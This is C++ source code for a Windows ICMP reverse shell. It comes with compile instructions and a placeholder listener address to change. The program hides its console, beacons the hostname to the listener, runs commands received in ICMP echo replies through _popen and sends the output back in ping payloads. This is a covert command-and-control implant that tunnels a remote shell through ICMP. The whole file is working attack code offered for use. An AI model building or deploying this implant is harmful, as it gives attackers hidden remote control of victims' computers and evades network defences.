// ICMP REVERSE SHELL - C++ VERSION
// Compile: g++ icmp_shell.cpp -o icmp_shell.exe -lws2_32 -static
// MUST RUN AS ADMINISTRATOR

#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <iostream>
#include <string>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#define LISTENER_IP "192.168.1.100"  // CHANGE THIS

class ICMPShell {
private:
    SOCKET rawSock;
    HANDLE hIcmp;
    WSADATA wsaData;
    DWORD targetAddr;
    
    // ICMP header structure
    typedef struct {
        BYTE type;
        BYTE code;
        USHORT checksum;
        USHORT id;
        USHORT seq;
    } ICMP_HEADER;
    
    USHORT CalculateChecksum(USHORT* buffer, int size) {
        ULONG cksum = 0;
        while (size > 1) {
            cksum += *buffer++;
            size -= sizeof(USHORT);
        }
        if (size) cksum += *(UCHAR*)buffer;
        cksum = (cksum >> 16) + (cksum & 0xffff);
        cksum += (cksum >> 16);
        return (USHORT)(~cksum);
    }
    
    bool InitRawSocket() {
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        
        rawSock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (rawSock == INVALID_SOCKET) return false;
        
        // Set socket timeout
        int timeout = 3000;
        setsockopt(rawSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        
        return true;
    }
    
    bool SendPing(const std::string& data) {
        char packet[1024];
        ICMP_HEADER* icmp = (ICMP_HEADER*)packet;
        
        icmp->type = 8;  // Echo request
        icmp->code = 0;
        icmp->checksum = 0;
        icmp->id = (USHORT)GetCurrentProcessId();
        icmp->seq = 1;
        
        // Copy data after header
        memcpy(packet + sizeof(ICMP_HEADER), data.c_str(), data.length());
        
        int packetSize = sizeof(ICMP_HEADER) + data.length();
        icmp->checksum = CalculateChecksum((USHORT*)packet, packetSize);
        
        sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = targetAddr;
        
        return sendto(rawSock, packet, packetSize, 0, 
            (sockaddr*)&dest, sizeof(dest)) > 0;
    }
    
    std::string ReceivePing() {
        char buffer[1024];
        sockaddr_in source;
        int sourceLen = sizeof(source);
        
        int bytes = recvfrom(rawSock, buffer, sizeof(buffer), 0, 
            (sockaddr*)&source, &sourceLen);
        
        if (bytes > 0) {
            // Skip IP header (20 bytes)
            ICMP_HEADER* icmp = (ICMP_HEADER*)(buffer + 20);
            
            if (icmp->type == 0) {  // Echo reply
                return std::string(buffer + 20 + sizeof(ICMP_HEADER), 
                    bytes - 20 - sizeof(ICMP_HEADER));
            }
        }
        return "";
    }
    
    std::string ExecuteCommand(const char* cmd) {
        char buffer[4096];
        std::string result;
        
        FILE* pipe = _popen(cmd, "r");
        if (pipe) {
            while (fgets(buffer, sizeof(buffer), pipe)) {
                result += buffer;
            }
            _pclose(pipe);
        }
        return result.empty() ? "OK" : result;
    }
    
public:
    ICMPShell() {
        targetAddr = inet_addr(LISTENER_IP);
        FreeConsole();
    }
    
    void Run() {
        if (!InitRawSocket()) return;
        
        // Send connection beacon
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        SendPing(std::string("[CONNECT] ") + hostname);
        
        while (true) {
            std::string cmd = ReceivePing();
            
            if (!cmd.empty()) {
                if (cmd == "exit") break;
                
                std::string output = ExecuteCommand(cmd.c_str());
                SendPing("[OUT] " + output);
            }
            
            Sleep(2000);  // Ping interval
        }
    }
};

int main() {
    ICMPShell shell;
    shell.Run();
    return 0;
}